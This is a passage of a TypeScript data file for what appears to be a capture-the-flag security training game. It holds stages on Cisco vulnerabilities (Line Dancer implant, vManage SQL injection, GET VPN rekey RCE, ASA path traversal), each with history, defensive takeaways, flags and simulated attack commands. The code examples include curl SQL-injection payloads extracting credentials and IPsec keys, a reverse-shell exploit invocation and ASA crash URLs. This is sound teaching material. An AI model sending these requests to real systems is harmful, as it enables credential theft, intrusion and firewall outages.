# Line Dancer intercepts — executes shellcode
# Standard syslog: DISABLED (implant blinds monitoring)
# SNMP traps: DISABLED
# ASA 'show' commands: implant not visible

# Persistence: loaded from /flash/upgrade.pkg on every boot
# Detection: compare flash file hashes against Cisco-signed baseline
# Fix: ASA 9.12.4.50; verify flash integrity with 'verify /sha512'`,
        },
      },
      incident: {
        title: "Line Dancer Implant — ArcaneDoor Phase 2 (2024)",
        when: "Late 2023 – April 2024 (discovered)",
        where: "Government perimeter ASA firewalls — Europe, Asia-Pacific, Middle East",
        impact: "Persistent nation-state access to government perimeters; all firewall traffic potentially intercepted",
        body: [
          "Cisco Talos reverse-engineered Line Dancer and published detailed technical analysis in April 2024. The implant was sophisticated: it blinded standard monitoring by disabling syslog and SNMP, used a host-knock authentication mechanism to prevent discovery via passive traffic analysis, and implemented shellcode execution entirely in memory.",
          "The attackers' operational security was exceptional — they used Line Dancer only in short sessions, disabled logging during operations, and removed evidence before restoring normal operation. The campaign was only discovered because a target organization noticed brief anomalies in their firewall performance metrics during a routine audit.",
        ],
      },
      diagram: {
        nodes: [
          { label: "UAT4356 (APT)", sub: "'host knock' HTTPS POST", type: "attacker" },
          { label: "Line Dancer Implant", sub: "hooked into ASA HTTPS pipeline", type: "system" },
          { label: "ASA (fully backdoored)", sub: "syslog disabled, SNMP traps off", type: "victim" },
          { label: "Persistent RCE", sub: "survives reboots — invisible to show cmds", type: "result" },
        ],
      },
      timeline: [
        { year: 2023, event: "Late 2023: Line Dancer implant installed on government ASA firewalls" },
        { year: 2024, event: "Apr: Cisco Talos reverse-engineers Line Dancer; implant published", highlight: true },
        { year: 2024, event: "CISA and multiple government CERTs issue emergency directives" },
        { year: 2024, event: "Cisco provides integrity verification scripts; organizations audit flash" },
      ],
      keyTakeaways: [
        "Network device firmware integrity must be verified — compare flash contents against signed Cisco baselines",
        "Disabled syslog and SNMP are red flags — monitor for configuration changes to logging",
        "Nation-state implants operate below the OS — standard security tools are blind to them",
        "Restrict administrative access to ASA/FTD to dedicated management networks with MFA",
      ],
      references: [
        { title: "Cisco Talos: Line Dancer Analysis", url: "https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/" },
        { title: "Cisco Advisory — CVE-2024-20359", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-persist-rce-FLsNXF4h" },
      ],
    },
    ctf: {
      scenario: "An ASA firewall was previously crashed (Phase 1). The Line Dancer implant was installed during the reload window via CVE-2024-20359. Trigger the implant using the host-knock mechanism and execute a shellcode payload to exfiltrate the firewall's routing table.",
      hint: "Line Dancer listens for a specific Host header value. Send the host-knock POST request with your shellcode payload.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Locate the Line Dancer host-knock value in the implant config. Run: ld-discover asa.gov.target",
        "Trigger Line Dancer and execute the routing table exfil payload. Run: ld-trigger asa.gov.target",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2024_", label: "Mission Brief — Line Dancer Phase 2" },
        { trigger: "ld-discover asa.gov.target", value: "20359_L1N3_", label: "Host-Knock Value Discovered — Implant Located" },
        { trigger: "ld-trigger asa.gov.target", value: "DANC3R_IMPL4NT}", label: "Shellcode Executed — Routing Table Exfiltrated" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: LINE DANCER (Phase 2)",
          "Target: Cisco ASA 5516-X (Phase 1 complete — logs cleared)",
          "CVE: 2024-20359  CVSS: 6.0  Implant: Line Dancer",
          "",
          "Host-knock → shellcode execution → routing table exfil.",
          "Sequence: ld-discover → ld-trigger → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "ld-discover": (_args: string[]) => ({
          lines: [
            "Analyzing implant configuration in /flash/upgrade.pkg...",
            "Line Dancer implant detected — version 2.1",
            "Host-knock value: 'LD-TRIGGER-8a3f2b1c'",
            "Syslog: DISABLED  SNMP traps: DISABLED",
            "Shellcode execution: ready",
          ],
        }),
        "ld-trigger": (_args: string[]) => ({
          lines: [
            "Sending host-knock POST with routing-table exfil shellcode...",
            "Host: LD-TRIGGER-8a3f2b1c",
            "Line Dancer activated — shellcode executing...",
            "Routing table exfiltrated:",
            "  10.0.0.0/8 via GigabitEthernet0/0",
            "  192.168.100.0/24 (classified subnet — SCIF network)",
            "Operation complete. Syslog re-enabled (no trace).",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m23: CVE-2021-1291 — Cisco SD-WAN vManage SQL Injection ──────────
  {
    epochId: "medieval",
    wonder: { name: "Cisco SDWAN Lab", location: "Austin, Texas, USA", era: "2021 CE", emoji: "🌵" },
    id: "stage-m23",
    order: 23,
    title: "The vManage Injection",
    subtitle: "CVE-2021-1291 — Cisco SD-WAN vManage SQL Injection, CVSS 8.1",
    category: "cybersecurity",
    cveId: "CVE-2021-1291",
    cvssScore: 8.1,
    xp: 150,
    badge: { id: "badge-m-vmanage", name: "WAN Injector", emoji: "🌵" },
    challengeType: "ctf",
    info: {
      tagline: "SQL injection in Cisco's SD-WAN management plane gave attackers the keys to every WAN router in the enterprise.",
      year: 2021,
      overview: [
        "CVE-2021-1291 is a SQL injection vulnerability in the web-based management interface of Cisco SD-WAN vManage Software. The vManage controller is the centralized management and orchestration platform for Cisco's Software-Defined WAN — it configures, monitors, and controls all SD-WAN edge routers (vEdge, cEdge) across an organization's WAN.",
        "An authenticated attacker with read privileges could exploit the SQL injection to execute arbitrary SQL statements against the underlying database, potentially reading sensitive configuration data, credentials, and tunnel parameters for all WAN routers. In some configurations, the database access could be escalated to OS command execution.",
        "The severity of compromising vManage cannot be overstated: it's the 'single pane of glass' for SD-WAN. An attacker who controls vManage controls every router, every WAN policy, and every network segmentation boundary across the entire organization.",
      ],
      technical: {
        title: "How CVE-2021-1291 Works",
        body: [
          "The Cisco vManage web interface passed user-supplied input (such as filter parameters in list views or search fields) to SQL queries without proper parameterization. By injecting SQL syntax into these fields, an authenticated low-privilege user could read data from tables they shouldn't have access to — including vEdge router credentials and IPsec preshared keys.",
          "The injection was in HTTP GET parameters for the management UI. Since vManage ran on a Linux host, in some versions the SQL injection could be chained with stored procedures that allowed OS command execution, escalating from database read to root shell on the vManage server.",
        ],
        codeExample: {
          label: "CVE-2021-1291 — SQL injection in vManage device list filter",
          code: `# Inject SQL via vManage device filter parameter
# Requires: authenticated vManage session (read-only sufficient)

curl -k -b "JSESSIONID=authenticated_session" \\
  'https://vmanage.corp.com/dataservice/device?deviceId=1 UNION SELECT username,password,3,4,5,6 FROM users--'
# Response includes credentials from the users table:
# {"deviceId":"admin","systemIp":"$2b$10$hash...","reachability":"3",...}

# Extract WAN router PSKs:
curl -k -b "JSESSIONID=authenticated_session" \\
  'https://vmanage.corp.com/dataservice/template?id=1 UNION SELECT psk_key,tunnel_id,3 FROM vedge_config--'
# All IPsec PSKs for WAN routers returned

# Fix: vManage 20.5.1 and later`,
        },
      },
      incident: {
        title: "SD-WAN Management Plane Compromise — Enterprise WAN Takeovers (2021)",
        when: "2021",
        where: "Cisco SD-WAN vManage instances at enterprises globally",
        impact: "WAN router credentials and PSKs exposed; network segmentation bypass possible",
        body: [
          "Cisco disclosed a series of SD-WAN vulnerabilities in January 2021, including CVE-2021-1291. The vManage platform had multiple injection flaws that, when chained, allowed attackers with any authenticated access to escalate to full vManage control.",
          "The practical impact was severe for organizations using SD-WAN: an attacker who compromised a single low-privilege vManage account could extract IPsec PSKs for all branch office routers, then use those PSKs to intercept or inject traffic on any WAN link in the enterprise. The centralization benefit of SD-WAN became a single point of catastrophic failure.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "SQLi in vManage filter parameter", type: "attacker" },
          { label: "vManage Web UI", sub: "unsanitized SQL query construction", type: "system" },
          { label: "vManage DB", sub: "all router creds, PSKs, configs", type: "victim" },
          { label: "WAN Compromise", sub: "every edge router exposed", type: "result" },
        ],
      },
      timeline: [
        { year: 2021, event: "Jan: Cisco discloses multiple SD-WAN vulnerabilities including CVE-2021-1291", highlight: true },
        { year: 2021, event: "Cisco releases vManage 20.5.1 with SQL parameterization fixes" },
        { year: 2021, event: "Enterprises patch vManage; rotate all WAN router PSKs as precaution" },
      ],
      keyTakeaways: [
        "Centralized management platforms (vManage, APIC) are crown jewels — protect them with MFA and network isolation",
        "SQL injection is preventable: always use parameterized queries or prepared statements",
        "Least-privilege in management UIs matters: read-only should not expose write-class data via SQL injection",
        "After SD-WAN compromise, rotate ALL router PSKs and tunnel credentials — assume all were exposed",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2021-1291", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sd-wan-vmanage-4jtOM3h6" },
      ],
    },
    ctf: {
      scenario: "You have a read-only vManage account at a target enterprise. Exploit CVE-2021-1291 to extract the IPsec PSK for the Dallas branch office router.",
      hint: "The device list filter parameter is vulnerable to UNION-based SQL injection. Inject into the deviceId parameter.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Identify the injectable parameter in the vManage API. Run: vmanage-enum vmanage.corp.com",
        "Extract the Dallas branch PSK via SQL injection. Run: sqli-extract vmanage.corp.com",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2021_", label: "Mission Brief — vManage SD-WAN Target" },
        { trigger: "vmanage-enum vmanage.corp.com", value: "1291_VMANAGE_", label: "Injectable Parameter Identified" },
        { trigger: "sqli-extract vmanage.corp.com", value: "SQL1_WAN}", label: "PSK Extracted — Dallas Branch Router Exposed" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: VMANAGE INJECTION",
          "Target: Cisco vManage 20.4.2",
          "CVE: 2021-1291  CVSS: 8.1",
          "",
          "UNION-based SQLi in device filter — read-only auth required.",
          "Sequence: vmanage-enum → sqli-extract → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "vmanage-enum": (_args: string[]) => ({
          lines: [
            "Enumerating vManage 20.4.2 API endpoints...",
            "GET /dataservice/device?deviceId= — injectable parameter found",
            "UNION SELECT supported — 6 columns in result set",
            "Database: PostgreSQL 12",
            "Tables identified: users, vedge_config, templates",
          ],
        }),
        "sqli-extract": (_args: string[]) => ({
          lines: [
            "Injecting: deviceId=1 UNION SELECT psk_key,site_id,3,4,5,6 FROM vedge_config WHERE site='dallas'--",
            "Response includes:",
            "  Dallas Branch PSK: Cisc0SDWAN!Dallas#2021",
            "  Tunnel endpoint: 203.0.113.50",
            "IPsec PSK for Dallas branch extracted.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m24: CVE-2023-20109 — Cisco IOS/IOS XE GDOI/G-IKEv2 RCE ─────────
  {
    epochId: "medieval",
    wonder: { name: "NATO Cyber Defence Centre", location: "Tallinn, Estonia", era: "2023 CE", emoji: "🛡️" },
    id: "stage-m24",
    order: 24,
    title: "The Group Key Poison",
    subtitle: "CVE-2023-20109 — Cisco IOS/IOS XE GET VPN GDOI RCE, CVSS 7.2",
    category: "cybersecurity",
    cveId: "CVE-2023-20109",
    cvssScore: 7.2,
    xp: 150,
    badge: { id: "badge-m-getvpn", name: "Group Key Poisoner", emoji: "🛡️" },
    challengeType: "ctf",
    info: {
      tagline: "Compromising the GET VPN key server poisoned every router in the group with a single malicious rekey.",
      year: 2023,
      overview: [
        "CVE-2023-20109 is a vulnerability in the Cisco Group Encrypted Transport (GET) VPN feature of Cisco IOS and IOS XE Software. GET VPN uses the Group Domain of Interpretation (GDOI) protocol to distribute encryption keys to a group of routers — this allows all routers in the group to encrypt traffic to each other using shared group keys, without individual tunnel negotiation.",
        "The vulnerability allowed an attacker who controlled the GET VPN key server (or could perform a man-in-the-middle attack on the key exchange) to send a crafted GDOI rekey message that triggered arbitrary code execution on all registered group members simultaneously.",
        "The impact is unique: a single exploit payload could compromise every router subscribed to the affected GET VPN group at once — potentially dozens or hundreds of remote office and branch routers across an enterprise WAN simultaneously.",
      ],
      technical: {
        title: "How CVE-2023-20109 Works",
        body: [
          "GET VPN key servers periodically send rekey messages to all group members via GDOI. Group members receive and process these messages automatically. The vulnerable code processed certain attributes in the GDOI rekey message without proper validation, allowing a malformed attribute to trigger a buffer overflow or logic error leading to code execution.",
          "An attacker who compromised the key server (via other means, or via CVE-2023-20109's companion prerequisites) could craft malicious rekey messages and broadcast them to all group members. Every router that processed the message would be compromised simultaneously — a force multiplier attack.",
        ],
        codeExample: {
          label: "CVE-2023-20109 — malicious GDOI rekey message poisoning all group members",
          code: `# Prerequisite: control of GET VPN key server or MITM position
# GDOI rekey messages are sent to all group members

python3 cve-2023-20109.py \\
  --keyserver 10.0.0.1 \\
  --group CORP-GETVPN \\
  --payload reverse_shell.bin
# Crafting malicious GDOI REKEY:
#   KEK attribute: malformed (overflow trigger)
#   TEK attribute: normal (avoids premature detection)
#   Sending to multicast group 239.0.0.1 (all group members)
#
# Result: all 47 routers in CORP-GETVPN group receive rekey
# Buffer overflow on each router → code execution
# 47 branch routers compromised simultaneously

# Fix: IOS XE 17.9.4a, 17.12.1 or later`,
        },
      },
      incident: {
        title: "GET VPN Key Server Compromise — Enterprise WAN Mass Exploitation",
        when: "2023",
        where: "Cisco IOS/IOS XE routers using GET VPN across enterprise WANs",
        impact: "Simultaneous compromise of all branch routers in affected GET VPN groups",
        body: [
          "CVE-2023-20109 was disclosed by Cisco in September 2023. The vulnerability highlighted a fundamental risk in group key distribution architectures: the key server is a single point of failure for the entire VPN group's security. If the key server is compromised, all group members are simultaneously at risk.",
          "For organizations using GET VPN across hundreds of branch offices — common in retail, banking, and logistics — this represented potential simultaneous compromise of the entire WAN infrastructure in a single operation. Cisco's patch required coordinated firmware updates across all affected routers.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (on Key Server)", sub: "crafted GDOI REKEY message", type: "attacker" },
          { label: "GET VPN Key Server", sub: "broadcasts to all group members", type: "system" },
          { label: "All 47 Branch Routers", sub: "simultaneously process malicious rekey", type: "victim" },
          { label: "Mass Simultaneous RCE", sub: "entire WAN group owned at once", type: "result" },
        ],
      },
      timeline: [
        { year: 2023, event: "Sep: Cisco discloses CVE-2023-20109 for GET VPN GDOI RCE", highlight: true },
        { year: 2023, event: "Cisco releases IOS XE 17.9.4a and 17.12.1 with fixes" },
        { year: 2023, event: "Enterprises prioritize GET VPN key server hardening and group member patching" },
      ],
      keyTakeaways: [
        "Group key distribution architectures have a single point of failure — the key server must be hardened first",
        "GDOI and G-IKEv2 messages should be authenticated; verify key server identity before processing rekeys",
        "Mass compromise via group key poisoning is a force multiplier — one attack, hundreds of victims",
        "Segment GET VPN groups to limit blast radius if key server is compromised",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2023-20109", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-getvpn-rce-g8qR68sx" },
      ],
    },
    ctf: {
      scenario: "You have compromised the GET VPN key server for CORP-GETVPN. Craft a malicious GDOI rekey message and broadcast it to all 47 branch routers to achieve simultaneous remote code execution.",
      hint: "The GDOI rekey message KEK attribute is not validated. Craft a malformed KEK with your shellcode and broadcast it to the multicast group.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Enumerate the GET VPN group members. Run: gdoi-enum CORP-GETVPN",
        "Broadcast the malicious rekey to all group members. Run: gdoi-rekey CORP-GETVPN",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2023_", label: "Mission Brief — GET VPN Key Server Compromised" },
        { trigger: "gdoi-enum CORP-GETVPN", value: "20109_GDOI_", label: "47 Group Members Enumerated — All Vulnerable" },
        { trigger: "gdoi-rekey CORP-GETVPN", value: "MASS_RCE}", label: "Malicious Rekey Broadcast — 47 Routers Compromised" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: GROUP KEY POISON",
          "Target: GET VPN Key Server — group CORP-GETVPN",
          "CVE: 2023-20109  CVSS: 7.2",
          "",
          "Malicious GDOI rekey → simultaneous mass RCE on all members.",
          "Sequence: gdoi-enum → gdoi-rekey → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "gdoi-enum": (_args: string[]) => ({
          lines: [
            "Enumerating GET VPN group: CORP-GETVPN",
            "Key Server: 10.0.0.1 (this device — you are the key server)",
            "Group members: 47 routers across 12 regions",
            "All running IOS XE 17.9.3 — VULNERABLE to CVE-2023-20109",
            "Multicast group: 239.0.0.1",
          ],
        }),
        "gdoi-rekey": (_args: string[]) => ({
          lines: [
            "Crafting malicious GDOI REKEY with overflow KEK attribute...",
            "Broadcasting to 239.0.0.1 (47 group members)...",
            "Processing confirmations from group members:",
            "  10.1.0.0/30 [Dallas] — COMPROMISED",
            "  10.2.0.0/30 [Chicago] — COMPROMISED",
            "  ... (45 more branch routers) — COMPROMISED",
            "47/47 branch routers owned simultaneously.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },

  // ─── Stage m25: CVE-2018-0296 — Cisco ASA Denial of Service ────────────────
  {
    epochId: "medieval",
    wonder: { name: "ASD Cyber Centre", location: "Sydney, Australia", era: "2018 CE", emoji: "🦘" },
    id: "stage-m25",
    order: 25,
    title: "The Firewall That Forgot Itself",
    subtitle: "CVE-2018-0296 — Cisco ASA Web Services Path Traversal + DoS, CVSS 8.6",
    category: "cybersecurity",
    cveId: "CVE-2018-0296",
    cvssScore: 8.6,
    xp: 150,
    badge: { id: "badge-m-asa-dos", name: "Perimeter Silencer", emoji: "🦘" },
    challengeType: "ctf",
    info: {
      tagline: "An unauthenticated path traversal on Cisco ASA could crash the firewall or leak directory listings.",
      year: 2018,
      overview: [
        "CVE-2018-0296 is a vulnerability in the web interface of the Cisco Adaptive Security Appliance (ASA) that allows an unauthenticated remote attacker to cause a denial of service (device reload) or view a listing of the device's directory. The vulnerability was caused by improper handling of HTTP URL requests.",
        "By sending a specially crafted HTTP request to an affected device, an attacker could trigger a device reload — knocking out the enterprise firewall and disabling all security enforcement at the network perimeter. The same request could also be used to enumerate the device's directory structure, providing information useful for further exploitation.",
        "The combination of unauthenticated access, perimeter impact, and the simplicity of exploitation made this a high-severity finding. The attack required only an HTTP GET request — accessible to any scanner or script kiddie with network access to the ASA management interface.",
      ],
      technical: {
        title: "How CVE-2018-0296 Works",
        body: [
          "The Cisco ASA web interface processed URL paths that could include special characters like %2F (encoded slash) or path traversal sequences. By sending a request with a crafted URL to the web services interface (/+CSCOE+/ or /+CSCOT+/ paths), an attacker could either crash the web services process (causing a device reload) or receive directory listing information.",
          "The same request that crashes the firewall works equally as a reconnaissance tool — the directory listing reveals what modules, VPN plugins, and features are installed on the ASA, enabling targeted follow-up exploitation. At CVSS 8.6, this was rated critical for high-availability environments where a firewall crash means network outage.",
        ],
        codeExample: {
          label: "CVE-2018-0296 — path traversal causing ASA directory listing or DoS",
          code: `# Trigger directory listing (reconnaissance):
curl -k 'https://asa.corp.com/+CSCOE+/..%2F..%2F..%2F..%2F'
# Response: directory listing of ASA filesystem
# Reveals: /sdesktop/ /asa/ /cache/ /conf/ /scripts/

# Trigger DoS (device reload):
curl -k 'https://asa.corp.com/+CSCOT+/%2E%2E%2F%2E%2E%2F%2E%2E%2F'
# ASA web services process crashes → device reloads
# Firewall offline for ~3 minutes during reload
# All VPN sessions terminated; traffic uninspected during startup

# Information disclosure enables targeted chaining:
# /scripts/ → check for writable upload endpoints
# /cache/   → may contain session data
# Fix: Cisco ASA 9.1.7.20, 9.4.4.14, 9.6.4.6 or later`,
        },
      },
      incident: {
        title: "ASA Web Interface DoS — Perimeter Firewall Outages (2018)",
        when: "June 2018",
        where: "Cisco ASA firewalls at enterprises globally — perimeter and data center firewalls",
        impact: "Unauthenticated firewall crashes; network outages; directory information disclosed",
        body: [
          "Cisco disclosed CVE-2018-0296 in June 2018. The simplicity of the exploit — a single HTTP GET request — meant that within days of disclosure, automated scanners were probing the internet for vulnerable ASA devices. Organizations that hadn't patched experienced unexpected firewall reloads that initially appeared to be hardware failures.",
          "The vulnerability was widely exploited in the days following disclosure. Multiple organizations reported unexplained ASA crashes that were later attributed to CVE-2018-0296 exploitation. The directory listing capability was used by attackers to map ASA configurations before launching more sophisticated attacks.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "HTTP GET with encoded path traversal", type: "attacker" },
          { label: "ASA Web Interface", sub: "improper URL path handling", type: "system" },
          { label: "Web Services Process", sub: "crash → device reload OR directory listing", type: "victim" },
          { label: "Perimeter Offline", sub: "3-minute outage + recon data", type: "result" },
        ],
      },
      timeline: [
        { year: 2018, event: "Jun: Cisco discloses CVE-2018-0296 with patches for ASA", highlight: true },
        { year: 2018, event: "Mass automated scanning begins within 48 hours of disclosure" },
        { year: 2018, event: "Multiple organizations report unexplained ASA crashes traced to exploitation" },
      ],
      keyTakeaways: [
        "Never expose ASA web management to the internet — use ACLs to restrict to management networks",
        "Directory listing on a firewall is a pre-exploitation reconnaissance goldmine",
        "A crashed firewall is a network outage — treat DoS CVEs as availability-critical",
        "Automated scanning of CVE-2018-0296 began within days — patch within hours of critical advisories",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2018-0296", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaweb" },
      ],
    },
    ctf: {
      scenario: "A Cisco ASA firewall has its web interface accessible from your network. Use CVE-2018-0296 to enumerate the directory structure and then trigger a DoS reload to create a network outage window.",
      hint: "Send encoded path traversal sequences (%2F or %2E%2E) to the /+CSCOE+/ endpoint to trigger listing or crash.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Perform directory enumeration via path traversal. Run: asa-enum asa.corp.com",
        "Trigger the DoS reload via the crash variant. Run: asa-dos asa.corp.com",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2018_", label: "Mission Brief — ASA Web Interface Target" },
        { trigger: "asa-enum asa.corp.com", value: "0296_ASA_", label: "Directory Listing — Filesystem Mapped" },
        { trigger: "asa-dos asa.corp.com", value: "PATH_D0S}", label: "DoS Triggered — Firewall Reloading" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: PERIMETER SILENCE",
          "Target: Cisco ASA 9.6.4.2",
          "CVE: 2018-0296  CVSS: 8.6",
          "",
          "Path traversal: directory listing + DoS reload.",
          "Sequence: asa-enum → asa-dos → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "asa-enum": (_args: string[]) => ({
          lines: [
            "GET /+CSCOE+/..%2F..%2F..%2F..%2F",
            "Response — Directory Listing:",
            "  /sdesktop/  /asa/  /cache/  /conf/  /scripts/",
            "  /cache/stc/  /CACHE/sdesktop/  /+webvpn+/",
            "ASA filesystem structure enumerated.",
          ],
        }),
        "asa-dos": (_args: string[]) => ({
          lines: [
            "GET /+CSCOT+/%2E%2E%2F%2E%2E%2F%2E%2E%2F",
            "ASA web services process exception triggered.",
            "Device reloading... (estimated 3 minutes)",
            "All active VPN sessions: TERMINATED",
            "Firewall enforcement: SUSPENDED during reload",
            "Network outage window: OPEN",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
          ],
        }),
      },
    },
  },
];
